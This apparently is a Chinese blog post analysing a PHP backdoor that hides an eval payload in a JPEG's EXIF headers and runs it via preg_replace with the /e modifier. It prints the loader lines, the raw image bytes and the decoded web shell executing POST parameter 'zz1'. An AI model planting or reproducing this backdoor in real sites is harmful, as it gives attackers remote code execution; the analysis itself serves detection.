---
layout: post
category: 黑客技术
tags: php 
title1: php 图片木马
keywords: php 图片木马
description: 这是一个非常有趣的后门，它并没有依靠正常模式去隐藏起内容(比如 base64/gzip 编码)，但是它却把自己的数据隐藏在JPEG图片的EXIT头部中了。它也使用exif_read_data和preg_replace两个PHP函数来读取EXIF头部和执行。
---

### 细节

这个后门可分为两部分。第一部分是 exif_read_data 函数读取图片头部，preg_replace 函数来执行内容。下面是我们在被攻破网站上发现的代码：

	$exif = exif_read_data('/homepages/clientsitepath/images/stories/food/bun.jpg');
	preg_replace($exif['Make'],$exif['Model'],'');

这两个函数本身是无害滴。exif_read_data 函数常用来读取图片，preg_replace 函数是替代字符内容。不过，preg_replace 函数函数有个隐藏并微妙的选项，如果你传入 “/e”，它会执行 eval() 中的内容，就不是去查询/替代了。
<br>

所以我们在查看bun.jpg文件时，发现后门的第二部分：

	ÿØÿà^@^PJFIF^@^A^B^@^@d^@d^@^@ÿá^@¡Exif^@^@II*^@^H^@^@^@^B^@^O^A^B^@^F^@^@^@&^@^@^@^P^A^B^@m^@^@^@,^@^@^@^@^@^@^@/.*/e^@ eval ( base64_decode("aWYgKGl zc2V0KCRfUE9TVFsie noxIl0pKSB7ZXZhbChzd
	HJpcHNsYXNoZXMoJF9QT1NUWyJ6ejEiXSkpO30='));
	@ÿì^@^QDucky^@^A^@^D^@^@^@<^@^@ÿî^@^NAdobe^

这个文件用以常见的头部开始，但是在 ”make” 头部中混入了奇怪的关键字 ”/.*/e” 。有了这个执行修饰符， preg_replace 会执行 eval() 中传入的任意内容。

<br>

事情变得开始有趣了……
<br>

如果咱们继续来看看 EXIF 数据，我们能发现， “eval ( base64_decode”隐藏在 ”Model“ 头部。把这些放在一起看，咱们就知道怎么回事了。攻击者是从 EXIF 中读取 Make 和 Model 头部信息，然后传入到 preg_replace 函数。只要我们修改 $exif['Make'] 和 $exif['Model'] ，就得到了最终的后门。

	preg_replace ("/.*/e", ,"@ eval ( base64_decode("aWYgKGl ...");

解码后我们可以看到是执行 $_POST["zz1"] 提供的内容。完整解码后的后面在这里。

	if (isset( $_POST["zz1"])) { eval (stripslashes( $_POST["zz1"]..

另外一个有意思的是，虽然 bun.jpg 和其他图片文件被修改了，但然后能加载并正常工作。实际上，在这些被攻破的站点，攻击者修改了站点上一个合法并之前就存在的图片。这是一种奇特的隐藏恶意软件的方法。

### 附：

>Call to undefined function exif_read_data()

读取图片Exif信息的程序就报出了：Call to undefined function exif_read_data()

找到解决方案：

>extension=php_exif.dll 将其加载顺序 改为在

>extension=php_mbstring.dll 之后....
